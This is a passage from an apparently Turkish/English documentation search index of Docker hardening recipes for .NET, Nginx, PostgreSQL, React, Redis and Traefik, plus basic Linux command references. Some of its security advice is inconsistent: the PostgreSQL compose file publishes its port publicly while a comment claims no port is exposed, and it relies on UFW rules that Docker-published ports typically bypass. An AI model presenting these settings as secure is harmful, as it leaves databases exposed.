s\u0131zsa bile \u00e7al\u0131\u015ft\u0131racak bir shell bulamaz (<code>RCE</code> neredeyse imkans\u0131zla\u015f\u0131r).</p> <pre><code># --- Build Stage ---\nFROM mcr.microsoft.com/dotnet/sdk:8.0 AS build\nWORKDIR /src\n\n# \u00d6nce csproj kopyala ve restore yap (Cache avantaj\u0131)\nCOPY [\"MyApp.csproj\", \"./\"]\nRUN dotnet restore \"MyApp.csproj\"\n\n# Kalan dosyalar\u0131 kopyala ve build al\nCOPY . .\nRUN dotnet publish \"MyApp.csproj\" -c Release -o /app/publish /p:UseAppHost=false\n\n# --- Final Stage (Chiseled Ubuntu) ---\n# \"jammy-chiseled\" etiketi = Shell yok, Package Manager yok, Root yok!\nFROM mcr.microsoft.com/dotnet/aspnet:8.0-jammy-chiseled AS final\nWORKDIR /app\n\n# Dosyalar\u0131 build stage'den al\nCOPY --from=build /app/publish .\n\n# .NET 8 Chiseled imajlar\u0131 varsay\u0131lan olarak \"app\" (UID 1654) kullan\u0131c\u0131s\u0131 ile \u00e7al\u0131\u015f\u0131r.\n# USER app  &lt;-- Yazmana gerek bile yok, default b\u00f6yle!\n\n# Non-root port (80 yerine 8080)\nEXPOSE 8080\nENV ASPNETCORE_HTTP_PORTS=8080\n\nENTRYPOINT [\"dotnet\", \"MyApp.dll\"]\n</code></pre>"},{"location":"recipes/dotnet/#2-alpine-versiyonu-alternatif","title":"2. Alpine Versiyonu (Alternatif) \ud83c\udfd4\ufe0f","text":"<p>E\u011fer Chiseled size uymuyorsa (\u00f6rne\u011fin debugging i\u00e7in shell laz\u0131msa), Alpine Linux kullan\u0131n ama mutlaka <code>USER</code> tan\u0131mlay\u0131n.</p> <pre><code>FROM mcr.microsoft.com/dotnet/aspnet:8.0-alpine\n\nWORKDIR /app\nCOPY --from=build /app/publish .\n\n# Alpine'de kullan\u0131c\u0131 olu\u015fturmaya gerek yok, \"app\" zaten var (veya guest)\n# Ancak biz garanti olsun diye \u00f6zel bir user ile \u00e7al\u0131\u015fal\u0131m\nRUN addgroup -g 1000 appgroup &amp;&amp; \\\n    adduser -u 1000 -G appgroup -D appuser\n\nUSER appuser\nEXPOSE 8080\nENV ASPNETCORE_HTTP_PORTS=8080\n\nENTRYPOINT [\"dotnet\", \"MyApp.dll\"]\n</code></pre>"},{"location":"recipes/dotnet/#3-docker-composeyml-hardening","title":"3. docker-compose.yml Hardening","text":"<pre><code>services:\n  api:\n    image: my-dotnet-api\n    # .NET 8 Chiseled i\u00e7in default user zaten non-root'tur.\n    # Ancak \"read_only\" dosya sistemi \u015fart!\n    read_only: true\n\n    # .NET'in temp dosyalar\u0131 i\u00e7in yaz\u0131labilir alan laz\u0131m\n    tmpfs:\n      - /tmp\n\n    deploy:\n      resources:\n        limits:\n          cpus: \"0.50\"\n          memory: 256M\n\n    cap_drop:\n      - ALL\n    cap_add:\n      - NET_BIND_SERVICE\n    security_opt:\n      - no-new-privileges:true\n</code></pre>"},{"location":"recipes/dotnet/#kssadan-hisse","title":"K\u0131ssadan Hisse","text":"<ul> <li>Chiseled \u0130maj Kullan: Sald\u0131rgana <code>bash</code> verme.</li> <li>Port 8080 Kullan: Port 80 root yetkisi ister, 8080 istemez.</li> <li>Read-Only Root: Uygulaman\u0131n diske yazmas\u0131na izin verme.</li> </ul>"},{"location":"recipes/mysql/","title":"MySQL / MariaDB","text":"<p>Production-ready MySQL or MariaDB setup using Docker.</p>"},{"location":"recipes/mysql/#configuration","title":"Configuration","text":"<p>Standard configuration includes:</p> <ul> <li>Secure root password</li> <li>Custom configuration via <code>my.cnf</code></li> <li>Persistent storage for <code>/var/lib/mysql</code></li> </ul>"},{"location":"recipes/mysql/#docker-compose-example","title":"Docker Compose Example","text":"<pre><code>version: \"3.8\"\n\nservices:\n  db:\n    image: mariadb:10.11\n    restart: always\n    environment:\n      MYSQL_ROOT_PASSWORD: ${DB_ROOT_PASS}\n      MYSQL_DATABASE: ${DB_NAME}\n      MYSQL_USER: ${DB_USER}\n      MYSQL_PASSWORD: ${DB_PASS}\n    volumes:\n      - db_data:/var/lib/mysql\n      - ./my.cnf:/etc/mysql/conf.d/my.cnf:ro\n    ports:\n      - \"127.0.0.1:3306:3306\"\n</code></pre>"},{"location":"recipes/nginx/","title":"Nginx Reverse Proxy Hardening \ud83c\udf10","text":"<p>Bu, uygulamalar\u0131n\u0131z\u0131n (React, .NET) \u00f6n\u00fcnde duran, internete a\u00e7\u0131lan Ana Kap\u0131d\u0131r. En \u00e7ok sald\u0131r\u0131 buraya gelir.</p>"},{"location":"recipes/nginx/#1-altn-konfigurasyon-nginxconf","title":"1. Alt\u0131n Konfig\u00fcrasyon (<code>nginx.conf</code>) \ud83c\udfc6","text":"<p>A\u015fa\u011f\u0131daki ayarlar DDoS korumas\u0131, SSL g\u00fcvenli\u011fi ve Header s\u0131k\u0131la\u015ft\u0131rmas\u0131n\u0131 i\u00e7erir.</p> <pre><code>user  nginx;\nworker_processes  auto;\n\nerror_log  /var/log/nginx/error.log notice;\npid        /var/run/nginx.pid;\n\nevents {\n    worker_connections  1024;\n}\n\nhttp {\n    include       /etc/nginx/mime.types;\n    default_type  application/octet-stream;\n\n    # --- G\u00dcVENL\u0130K AYARLARI ---\n\n    # 1. Versiyon gizleme (Sald\u0131rgan s\u00fcr\u00fcm\u00fc bilmesin)\n    server_tokens off;\n\n    # 2. Buffer Overflow Korumas\u0131\n    client_body_buffer_size 10K;\n    client_header_buffer_size 1k;\n    client_max_body_size 8m;\n    large_client_header_buffers 2 1k;\n\n    # 3. Timeout Ayarlar\u0131 (Slowloris sald\u0131r\u0131s\u0131 korumas\u0131)\n    client_body_timeout 12;\n    client_header_timeout 12;\n    keepalive_timeout 15;\n    send_timeout 10;\n\n    # 4. Gzip (Veri s\u0131zmas\u0131n\u0131 \u00f6nlemek i\u00e7in BREACH attack'a dikkat, kapal\u0131 olabilir)\n    gzip off;\n\n    # 5. Header Hardening (Browser G\u00fcvenli\u011fi)\n    add_header X-Frame-Options \"SAMEORIGIN\" always;\n    add_header X-XSS-Protection \"1; mode=block\" always;\n    add_header X-Content-Type-Options \"nosniff\" always;\n    add_header Referrer-Policy \"no-referrer-when-downgrade\" always;\n    add_header Content-Security-Policy \"default-src 'self' http: https: data: blob: 'unsafe-inline'\" always;\n\n    # 6. SSL Hardening (A+ Puan i\u00e7in)\n    ssl_protocols TLSv1.2 TLSv1.3;\n    ssl_prefer_server_ciphers on;\n    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384;\n\n    include /etc/nginx/conf.d/*.conf;\n}\n</code></pre>"},{"location":"recipes/nginx/#2-docker-compose-kurulumu","title":"2. Docker Compose Kurulumu","text":"<p>Nginx'i de root \u00e7al\u0131\u015ft\u0131rmamak m\u00fcmk\u00fcnd\u00fcr ancak ana portlar\u0131 (80/443) dinleyece\u011fi i\u00e7in genellikle gateway olarak root ba\u015flar, sonra user d\u00fc\u015fer (<code>user nginx</code> ayar\u0131 ile).</p> <pre><code>services:\n  proxy:\n    image: nginx:alpine\n    volumes:\n      - ./nginx.conf:/etc/nginx/nginx.conf:ro\n      - ./conf.d:/etc/nginx/conf.d:ro\n      - ./certs:/etc/nginx/certs:ro\n    ports:\n      - \"80:80\"\n      - \"443:443\"\n    networks:\n      - frontend\n\n    # Kaynak limiti (DDoS an\u0131nda sunucuyu vermemek i\u00e7in)\n    deploy:\n      resources:\n        limits:\n          cpus: \"0.50\"\n          memory: 256M\n\n    # Auto-restart (\u00c7\u00f6kerse kalks\u0131n)\n    restart: always\n</code></pre>"},{"location":"recipes/nginx/#3-rate-limiting-ddos-frenleme","title":"3. Rate Limiting (DDoS Frenleme) \ud83d\uded1","text":"<p>Belirli bir IP'den \u00e7ok fazla istek gelirse engellemek i\u00e7in <code>conf.d/app.conf</code> i\u00e7ine ekleyin:</p> <pre><code># IP ba\u015f\u0131na saniyede max 10 istek (10MB haf\u0131za ay\u0131r)\nlimit_req_zone $binary_remote_addr zone=mylimit:10m rate=10r/s;\n\nserver {\n    location / {\n        # Limiti uygula (Burst 20 iste\u011fe kadar izin ver, sonra reddet)\n        limit_req zone=mylimit burst=20 nodelay;\n\n        proxy_pass http://my-app:8080;\n    }\n}\n</code></pre> <p>Bu ayar, botnet sald\u0131r\u0131lar\u0131n\u0131 Nginx seviyesinde keser, uygulaman\u0131za y\u00fck bindirmez.</p>"},{"location":"recipes/postgres/","title":"PostgreSQL Production-Ready Kurulum \ud83d\udc18","text":"<p>Bu rehber, sunucunuzda tek bir merkezi PostgreSQL sunucusu kurarak, kaynaklar\u0131 verimli kullanan, g\u00fcvenli ve performans\u0131 optimize edilmi\u015f bir yap\u0131 olu\u015fturman\u0131z\u0131 sa\u011flar.</p>"},{"location":"recipes/postgres/#1-klasor-yaps","title":"1. Klas\u00f6r Yap\u0131s\u0131","text":"<p>T\u00fcm veritaban\u0131 dosyalar\u0131 tek bir merkezde toplan\u0131r.</p> <pre><code>/mnt/block/postgres/\n\u251c\u2500\u2500 docker-compose.yml\n\u251c\u2500\u2500 secrets/\n\u2502   \u2514\u2500\u2500 db_password.txt\n\u251c\u2500\u2500 config/\n\u2502   \u2514\u2500\u2500 postgresql.conf\n\u251c\u2500\u2500 data/                    (otomatik olu\u015facak - PERSISTENT DATA)\n\u2514\u2500\u2500 logs/                    (otomatik olu\u015facak)\n</code></pre>"},{"location":"recipes/postgres/#2-kurulum-admlar","title":"2. Kurulum Ad\u0131mlar\u0131","text":"<p>SSH ile sunucuya ba\u011flan\u0131n ve a\u015fa\u011f\u0131daki ad\u0131mlar\u0131 s\u0131ras\u0131yla uygulay\u0131n.</p>"},{"location":"recipes/postgres/#adm-1-klasorleri-olustur","title":"Ad\u0131m 1: Klas\u00f6rleri Olu\u015ftur","text":"<pre><code>cd /mnt/block\nsudo mkdir -p postgres/{secrets,config,data,logs}\n# \u0130zinleri ayarla (Docker i\u00e7inde sorun \u00e7\u0131kmamas\u0131 i\u00e7in)\nsudo chown -R $USER:$USER postgres\ncd postgres\n</code></pre>"},{"location":"recipes/postgres/#adm-2-secret-sifre-dosyas","title":"Ad\u0131m 2: Secret (\u015eifre) Dosyas\u0131","text":"<p>Environment variable yerine dosya tabanl\u0131 secret kullanmak en g\u00fcvenli y\u00f6ntemdir.</p> <pre><code># G\u00fc\u00e7l\u00fc \u015fifre olu\u015ftur\nopenssl rand -base64 32 &gt; secrets/db_password.txt\n\n# Sadece owner okuyabilsin (G\u00fcvenlik)\nchmod 600 secrets/db_password.txt\n\n# \u015eifreyi g\u00f6r ve B\u0130R YERE KAYDET! (Bir daha g\u00f6remeyebilirsiniz)\ncat secrets/db_password.txt\n</code></pre>"},{"location":"recipes/postgres/#adm-3-postgresql-config-tuning","title":"Ad\u0131m 3: PostgreSQL Config (Tuning)","text":"<p>Varsay\u0131lan ayarlar production i\u00e7in zay\u0131ft\u0131r. A\u015fa\u011f\u0131daki konfig\u00fcrasyon 24GB RAM'li bir sunucu (\u00f6rn: Oracle ARM) i\u00e7in optimize edilmi\u015ftir.</p> <p>[!NOTE] Daha d\u00fc\u015f\u00fck RAM i\u00e7in <code>shared_buffers</code> ve <code>work_mem</code> de\u011ferlerini d\u00fc\u015f\u00fcr\u00fcn. (Genelde <code>shared_buffers</code> RAM'in %25'i olmal\u0131d\u0131r).</p> <pre><code>cat &lt;&lt; 'EOF' &gt; config/postgresql.conf\n# ===========================================\n# PostgreSQL Production Config\n# ===========================================\n\n# Ba\u011flant\u0131lar\nlisten_addresses = '*'\nmax_connections = 100\n\n# Haf\u0131za (\u00d6rn: 24GB RAM i\u00e7in)\nshared_buffers = 6GB\nwork_mem = 64MB\nmaintenance_work_mem = 512MB\neffective_cache_size = 18GB\n\n# Write Ahead Log (WAL) - Veri g\u00fcvenli\u011fi\nwal_level = replica\nmax_wal_size = 2GB\nmin_wal_size = 512MB\ncheckpoint_completion_target = 0.9\n\n# Loglama (Sald\u0131r\u0131 ve Hata tespiti i\u00e7in)\nlog_destination = 'stderr'\nlogging_collector = on\nlog_directory = 'log'\nlog_filename = 'postgresql-%Y-%m-%d.log'\nlog_rotation_age = 1d\nlog_rotation_size = 100MB\nlog_statement = 'ddl'    # Sadece tablo yap\u0131 de\u011fi\u015fikliklerini logla\nlog_connections = on\nlog_disconnections = on\nlog_lock_waits = on\n\n# Locale\nlc_messages = 'en_US.UTF-8'\nEOF\n</code></pre>"},{"location":"recipes/postgres/#adm-4-docker-compose","title":"Ad\u0131m 4: Docker Compose","text":"<p>Bu dosya servisi aya\u011fa kald\u0131r\u0131r ve g\u00fcvenlik k\u0131s\u0131tlamalar\u0131n\u0131 uygular.</p> <pre><code># docker-compose.yml\nservices:\n  postgres:\n    image: postgres:16-alpine\n    container_name: postgres-global\n    restart: unless-stopped\n\n    # \u015eifre dosyadan okunuyor (security best-practice)\n    environment:\n      POSTGRES_USER: admin\n      POSTGRES_PASSWORD_FILE: /run/secrets/db_password\n      POSTGRES_DB: defaultdb\n      PGDATA: /var/lib/postgresql/data/pgdata\n\n    secrets:\n      - db_password\n\n    volumes:\n      - ./data:/var/lib/postgresql/data\n      - ./config/postgresql.conf:/etc/postgresql/postgresql.conf:ro\n      - ./logs:/var/lib/postgresql/data/log\n\n    # Custom config dosyas\u0131n\u0131 kullan\n    command: postgres -c config_file=/etc/postgresql/postgresql.conf\n\n    # --- Hardening (S\u0131k\u0131la\u015ft\u0131rma) ---\n    read_only: true # Dosya sistemi salt-okunur\n    tmpfs: # Ge\u00e7ici dosyalar RAM'de\n      - /tmp\n      - /var/run/postgresql\n    shm_size: 512mb # Performans i\u00e7in kritik\n\n    # Resource limits (Kom\u015fular\u0131 rahats\u0131z etme)\n    deploy:\n      resources:\n        limits:\n          cpus: \"2.0\"\n          memory: 8G\n        reservations:\n          memory: 2G\n\n    # SADECE internal network - D\u0131\u015far\u0131ya port YOK!\n    # Geli\u015ftirme i\u00e7in port a\u00e7acaksan\u0131z UFW ile koruyun!\n    # Port Stratejisi: 5432 yerine 54321 kullan\u0131yoruz (Obscurity)\n    ports:\n      - \"54321:5432\"\n    networks:\n      - shared-network\n\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U admin -d defaultdb\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n\nsecrets:\n  db_password:\n    file: ./secrets/db_password.txt\n\nnetworks:\n  shared-network:\n    name: shared-network\n    driver: bridge\n</code></pre>"},{"location":"recipes/postgres/#adm-5-baslat-ve-test-et","title":"Ad\u0131m 5: Ba\u015flat ve Test Et","text":"<pre><code># 1. Ortak a\u011f\u0131 olu\u015ftur (Di\u011fer projeler de buna ba\u011flanacak)\ndocker network create shared-network 2&gt;/dev/null || true\n\n# 2. Servisi ba\u015flat\ndocker compose up -d\n\n# 3. Loglar\u0131 kontrol et\ndocker logs -f postgres-global\n\n# 4. Ba\u011flant\u0131 testi (Admin olarak)\ndocker exec -it postgres-global psql -U admin -d defaultdb -c \"SELECT version();\"\n</code></pre>"},{"location":"recipes/postgres/#3-projeler-nasl-baglanr","title":"3. Projeler Nas\u0131l Ba\u011flan\u0131r?","text":"<p>Yeni bir proje (\u00f6rne\u011fin bir Node.js API) olu\u015fturdu\u011funuzda, <code>docker-compose.yml</code> i\u00e7inde ayr\u0131ca bir veritaban\u0131 servisi tan\u0131mlamay\u0131n. Bunun yerine bu global servise ba\u011flan\u0131n.</p>"},{"location":"recipes/postgres/#a-veritaban-olusturma","title":"A. Veritaban\u0131 Olu\u015fturma","text":"<p>Projeyi deploy etmeden \u00f6nce database'i olu\u015fturun:</p> <pre><code>docker exec -it postgres-global psql -U admin -d defaultdb &lt;&lt; 'EOF'\nCREATE DATABASE proje1_db;\nCREATE USER proje1_user WITH ENCRYPTED PASSWORD 'projeye_ozel_sifre';\nGRANT ALL PRIVILEGES ON DATABASE proje1_db TO proje1_user;\nEOF\n</code></pre>"},{"location":"recipes/postgres/#b-proje-docker-compose-ayar","title":"B. Proje Docker Compose Ayar\u0131","text":"<pre><code># /mnt/block/projeler/proje1/docker-compose.yml\nservices:\n  api:\n    image: my-company/api:latest\n    environment:\n      # Host ad\u0131 container_name ile ayn\u0131d\u0131r: postgres-global\n      DATABASE_URL: postgres://proje1_user:projeye_ozel_sifre@postgres-global:5432/proje1_db\n    networks:\n      - shared-network\n\nnetworks:\n  shared-network:\n    external: true # Mevcut global a\u011f\u0131 kullan\n</code></pre>"},{"location":"recipes/postgres/#4-uzaktan-erisim-gelistirme-icin","title":"4. Uzaktan Eri\u015fim (Geli\u015ftirme \u0130\u00e7in)","text":"<p>Veritaban\u0131na local bilgisayar\u0131n\u0131zdan ba\u011flan\u0131p geli\u015ftirmek yapmak i\u00e7in iki y\u00f6ntem vard\u0131r.</p>"},{"location":"recipes/postgres/#yontem-1-ssh-tunel-onerilen-en-guvenli","title":"Y\u00f6ntem 1: SSH T\u00fcnel (\u00d6nerilen - En G\u00fcvenli)","text":"<p>Port a\u00e7man\u0131za (<code>ports:</code>) gerek yoktur. SSH \u00fczerinden g\u00fcvenli bir t\u00fcnel a\u00e7arak ba\u011flan\u0131rs\u0131n\u0131z.</p> <pre><code># Local bilgisayar\u0131n\u0131zda:\n# Remote'daki 5432 portunu (Internal), Local'deki 5433 portuna ba\u011fla\nssh -L 5433:localhost:5432 root@sunucu-ip\n</code></pre> <p>Ba\u011flant\u0131 arac\u0131n\u0131zda (DBeaver, DataGrip):</p> <ul> <li>Host: localhost</li> <li>Port: 5433</li> <li>User: admin</li> </ul>"},{"location":"recipes/postgres/#yontem-2-public-port-ip-kstlamal","title":"Y\u00f6ntem 2: Public Port (IP K\u0131s\u0131tlamal\u0131)","text":"<p><code>docker-compose.yml</code> dosyas\u0131nda <code>ports: - \"54321:5432\"</code> sat\u0131r\u0131n\u0131 a\u00e7\u0131n. Ancak portu t\u00fcm d\u00fcnyaya a\u00e7mak yerine UFW ile sadece kendi IP'nize izin verin.</p> <pre><code># 1. Varsay\u0131lan kural: Herkesi engelle\nsudo ufw deny 54321\n\n# 2. Sadece kendi IP'ne izin ver (STANDART DISI PORT)\n# (Kendi IP adresini 'curl ifconfig.me' ile \u00f6\u011fren)\nsudo ufw allow from 88.241.x.x to any port 54321 proto tcp\n\n# 3. Kontrol et\nsudo ufw status\n</code></pre> <p>[!WARNING] \u015eifreniz g\u00fc\u00e7l\u00fc olsa bile portu t\u00fcm d\u00fcnyaya (<code>allow 54321</code>) a\u00e7may\u0131n. Fail2Ban arka planda \u00e7al\u0131\u015fsa da, 0-day a\u00e7\u0131klar\u0131na kar\u015f\u0131 risk al\u0131rs\u0131n\u0131z.</p>"},{"location":"recipes/postgres/#4-faydal-komutlar","title":"4. Faydal\u0131 Komutlar","text":"\u0130\u015flem Komut Ba\u011flan (SQL Shell) <code>docker exec -it postgres-global psql -U admin -d defaultdb</code> Loglar\u0131 G\u00f6r <code>docker logs -f postgres-global</code> Aktif Ba\u011flant\u0131lar <code>docker exec postgres-global psql -U admin -c \"SELECT * FROM pg_stat_activity;\"</code> Disk Boyutu <code>docker exec postgres-global psql -U admin -c \"SELECT pg_size_pretty(pg_database_size('defaultdb'));\"</code> H\u0131zl\u0131 Backup <code>docker exec postgres-global pg_dumpall -U admin &gt; backup-$(date +%F).sql</code>"},{"location":"recipes/postgres/#5-guvenlik-ve-performans-ozeti","title":"5. G\u00fcvenlik ve Performans \u00d6zeti","text":"<ul> <li>\u2705 \u015eifre: Dosya tabanl\u0131 (Secrets) y\u00f6netiliyor, environment variable'da g\u00f6r\u00fcnm\u00fcyor.</li> <li>\u2705 Network: D\u0131\u015far\u0131ya kapal\u0131 veya UFW ile IP k\u0131s\u0131tlamal\u0131.</li> <li>\u2705 Dosya Sistemi: <code>read_only</code> modunda, sald\u0131rganlar\u0131n dosya yazmas\u0131n\u0131 engeller.</li> <li>\u2705 Performans: <code>postgresql.conf</code> ile donan\u0131ma uygun tuning yap\u0131ld\u0131.</li> <li>\u2705 Monitoring: Healthcheck ve detayl\u0131 loglama aktif.</li> </ul>"},{"location":"recipes/react/","title":"React &amp; Nginx Docker Hardening \u269b\ufe0f","text":"<p>React/Vue/Angular gibi SPA (Single Page Application) projelerini sunmak i\u00e7in Nginx kullan\u0131r\u0131z. Ancak standart Nginx imaj\u0131 <code>root</code> \u00e7al\u0131\u015f\u0131r. Bunu g\u00fcvenli hale getirelim.</p>"},{"location":"recipes/react/#1-guvenli-nginx-konfigurasyonu-nginxconf","title":"1. G\u00fcvenli Nginx Konfig\u00fcrasyonu (<code>nginx.conf</code>) \u2699\ufe0f","text":"<p>\u00d6nce projenizin k\u00f6k dizinine <code>nginx.conf</code> dosyas\u0131n\u0131 olu\u015fturun. Bu ayarlar g\u00fcvenli\u011fi art\u0131r\u0131r.</p> <pre><code>server {\n    listen 8080; # Non-root port (80 yerine 8080)\n    server_name localhost;\n\n    root /usr/share/nginx/html;\n    index index.html;\n\n    # G\u00fcvenlik Headerlar\u0131\n    add_header X-Frame-Options \"DENY\";\n    add_header X-CONTENT-TYPE-OPTIONS \"nosniff\";\n    add_header Referrer-Policy \"strict-origin-when-cross-origin\";\n\n    # Nginx s\u00fcr\u00fcm\u00fcn\u00fc gizle\n    server_tokens off;\n\n    location / {\n        try_files $uri $uri/ /index.html;\n    }\n\n    # Cache ayarlar\u0131 (Opsiyonel)\n    location ~* \\.(js|css|png|jpg|jpeg|gif|ico)$ {\n        expires 1y;\n        add_header Cache-Control \"public, no-transform\";\n    }\n}\n</code></pre>"},{"location":"recipes/react/#2-multi-stage-dockerfile","title":"2. Multi-Stage Dockerfile \ud83c\udfd7\ufe0f","text":"<pre><code># --- Stage 1: Build (Node.js) ---\nFROM node:18-alpine AS builder\nWORKDIR /app\n\nCOPY package*.json ./\nRUN npm ci\n\nCOPY . .\nRUN npm run build\n\n# --- Stage 2: Serve (Nginx Unprivileged) ---\n# Resmi \"nginxinc/nginx-unprivileged\" imaj\u0131 root gerektirmez!\nFROM nginxinc/nginx-unprivileged:alpine AS production\n\n# Varsay\u0131lan user: nginx (UID 101)\n# Varsay\u0131lan port: 8080\n\n# Kendi config dosyam\u0131z\u0131 kopyalayal\u0131m\nCOPY nginx.conf /etc/nginx/conf.d/default.conf\n\n# Build ald\u0131\u011f\u0131m\u0131z React dosyalar\u0131n\u0131 kopyalayal\u0131m\nCOPY --from=builder /app/dist /usr/share/nginx/html\n\n# Portu a\u00e7 (8080)\nEXPOSE 8080\n\nCMD [\"nginx\", \"-g\", \"daemon off;\"]\n</code></pre>"},{"location":"recipes/react/#3-docker-composeyml-hardening","title":"3. docker-compose.yml Hardening","text":"<pre><code>services:\n  frontend:\n    image: my-react-app\n    # Unprivileged image zaten UID 101 ile \u00e7al\u0131\u015f\u0131r\n    read_only: true\n\n    # Nginx'in ge\u00e7ici dosyalar\u0131 i\u00e7in izin ver\n    tmpfs:\n      - /tmp\n      - /var/cache/nginx\n      - /var/run\n\n    deploy:\n      resources:\n        limits:\n          cpus: \"0.25\"\n          memory: 128M\n\n    cap_drop:\n      - ALL\n    security_opt:\n      - no-new-privileges:true\n</code></pre>"},{"location":"recipes/react/#neden-nginx-unprivileged","title":"Neden \"nginx-unprivileged\"?","text":"<p>Standart <code>nginx:alpine</code> imaj\u0131 port 80'i dinlemek i\u00e7in <code>root</code> yetkisiyle ba\u015flar (sonra user de\u011fi\u015ftirse bile risklidir). <code>nginxinc/nginx-unprivileged</code> ise ba\u015ftan itibaren yetkisiz ba\u015flar ve 8080 portunu kullan\u0131r. En g\u00fcvenli y\u00f6ntem budur.</p>"},{"location":"recipes/redis/","title":"Redis","text":"<p>High-performance in-memory data store for caching and session management.</p>"},{"location":"recipes/redis/#setup","title":"Setup","text":"<p>Use Redis for:</p> <ul> <li>Application Cache (e.g. Laravel, Rails, Node.js)</li> <li>Queue Management (e.g. Sidekiq, Bull)</li> <li>Session Storage</li> </ul>"},{"location":"recipes/redis/#docker-compose","title":"Docker Compose","text":"<pre><code>version: \"3.8\"\n\nservices:\n  redis:\n    image: redis:7-alpine\n    restart: always\n    command: redis-server --requirepass ${REDIS_PASSWORD}\n    volumes:\n      - redis_data:/data\n    ports:\n      - \"127.0.0.1:6379:6379\"\n\nvolumes:\n  redis_data:\n</code></pre>"},{"location":"recipes/traefik/","title":"Traefik Proxy","text":"<p>Modern HTTP reverse proxy and load balancer intended to deploy microservices with ease.</p>"},{"location":"recipes/traefik/#overview","title":"Overview","text":"<p>Traefik natively supports Docker and can automatically discover new services.</p>"},{"location":"recipes/traefik/#basic-configuration","title":"Basic Configuration","text":"<p><code>docker-compose.yml</code>:</p> <pre><code>version: \"3\"\n\nservices:\n  traefik:\n    image: traefik:v2.9\n    command:\n      - \"--api.insecure=false\"\n      - \"--providers.docker=true\"\n      - \"--entrypoints.web.address=:80\"\n      - \"--entrypoints.websecure.address=:443\"\n    ports:\n      - \"80:80\"\n      - \"443:443\"\n    volumes:\n      - \"/var/run/docker.sock:/var/run/docker.sock:ro\"\n</code></pre>"},{"location":"reference/commands/disk/","title":"Disk ve Kaynak Y\u00f6netimi","text":"<p>\"Disk doldu\" veya \"RAM bitti\" durumlar\u0131nda ilk bak\u0131lacak komutlar.</p>"},{"location":"reference/commands/disk/#1-disk-kullanm","title":"1. Disk Kullan\u0131m\u0131","text":"<p>Disk neden doldu?</p> <pre><code># Genel disk durumu (Human readable)\ndf -h\n# \u00c7\u0131kt\u0131da 'Use%' s\u00fctunu %90 \u00fczerindeyse alarm!\n\n# Hangi klas\u00f6r ne kadar yer kapl\u0131yor?\ndu -sh *\n# Bulundu\u011funuz dizindeki dosyalar\u0131n boyutunu \u00f6zetler.\n\n# En b\u00fcy\u00fck 10 klas\u00f6r\u00fc bul (Sihirli komut)\ndu -ahx . | sort -rh | head -10\n</code></pre>"},{"location":"reference/commands/disk/#2-ram-bellek-durumu","title":"2. RAM (Bellek) Durumu","text":"<pre><code># RAM kullan\u0131m\u0131 (Megabyte cinsinden)\nfree -m\n\n# Detayl\u0131 bellek \u00f6zeti (Cache vs g\u00f6rmek i\u00e7in)\n# 'available' s\u00fctunu \u00f6nemlidir. 'free' az g\u00f6r\u00fcnebilir (Linux cache sever).\n</code></pre>"},{"location":"reference/commands/disk/#3-cpu-ve-yuk-durumu","title":"3. CPU ve Y\u00fck Durumu","text":"<pre><code># Anl\u0131k sistem izleme (G\u00f6rev y\u00f6neticisi)\nhtop\n# (Yoksa: apt install htop)\n\n# Sistem y\u00fck ortalamas\u0131 (1, 5, 15 dk)\nuptime\n# Sondaki 3 say\u0131, i\u015flemci \u00e7ekirdek say\u0131s\u0131n\u0131 ge\u00e7memeli.\n</code></pre>"},{"location":"reference/commands/docker/","title":"Docker Commands","text":"<p>Essential Docker commands for daily operations.</p>"},{"location":"reference/commands/docker/#container-management","title":"Container Management","text":"Action Command List Running <code>docker ps</code> List All <code>docker ps -a</code> Logs <code>docker logs -f &lt;container&gt;</code> Shell Access <code>docker exec -it &lt;container&gt; sh</code> Stats <code>docker stats</code>"},{"location":"reference/commands/docker/#image-management","title":"Image Management","text":"Action Command List Images <code>docker images</code> Pull Image <code>docker pull &lt;image&gt;</code> Remove Image <code>docker rmi &lt;image_id&gt;</code> Prune Unused <code>docker system prune -a</code>"},{"location":"reference/commands/docker/#wrapper-functions-optional","title":"Wrapper Functions (Optional)","text":"<p>Using <code>~/.zshrc</code> aliases:</p> <pre><code>alias dps='docker ps --format \"table {{.ID}}\\t{{.Names}}\\t{{.Status}}\\t{{.Ports}}\"'\nalias dlogs='docker logs -f'\n</code></pre>"},{"location":"reference/commands/file/","title":"Dosya ve Dizin Komutlar\u0131","text":"<p>Sunucu y\u00f6netiminde en \u00e7ok kullan\u0131lan dosya arama, i\u00e7erik okuma ve yetkilendirme komutlar\u0131.</p>"},{"location":"reference/commands/file/#1-arama-find-grep","title":"1. Arama (Find &amp; Grep)","text":"<p>Arad\u0131\u011f\u0131n\u0131z dosyay\u0131 veya metni bulam\u0131yorsan\u0131z:</p> <pre><code># \u0130sme g\u00f6re dosya bul (\u00d6rn: .log ile bitenler)\nfind . -name \"*.log\"\n\n# B\u00fcy\u00fck dosyalar\u0131 bul (100MB'dan b\u00fcy\u00fck)\nfind /var -size +100M\n\n# Son 24 saatte de\u011fi\u015ftirilen dosyalar\nfind . -mtime -1\n\n# \u0130\u00e7erikte metin ara (Recursive)\ngrep -r \"error\" /var/log/\n\n# Sadece dosya ismini g\u00f6ster, i\u00e7eri\u011fi g\u00f6sterme\ngrep -rl \"sunucu hatasi\" .\n</code></pre>"},{"location":"reference/commands/file/#2-icerik-goruntuleme","title":"2. \u0130\u00e7erik G\u00f6r\u00fcnt\u00fcleme","text":"<pre><code># Dosyay\u0131 canl\u0131 izle (Loglar i\u00e7in birebir)\ntail -f access.log\n\n# Son 50 sat\u0131r\u0131 g\u00f6ster ve izle\ntail -n 50 -f access.log\n\n# Dosyay\u0131 sayfa sayfa oku (Bo\u015fluk ile ilerle, q ile \u00e7\u0131k)\nless buyuk_dosya.txt\n\n# Dosyan\u0131n ba\u015f\u0131n\u0131 g\u00f6r (\u0130lk 10 sat\u0131r)\nhead config.yaml\n</code></pre>"},{"location":"reference/commands/file/#3-izinler-ve-sahiplik-chmod-chown","title":"3. \u0130zinler ve Sahiplik (Chmod &amp; Chown)","text":"<pre><code># Dosyay\u0131 \u00e7al\u0131\u015ft\u0131r\u0131labilir yap\nchmod +x script.sh\n\n# Sadece sahibine tam yetki 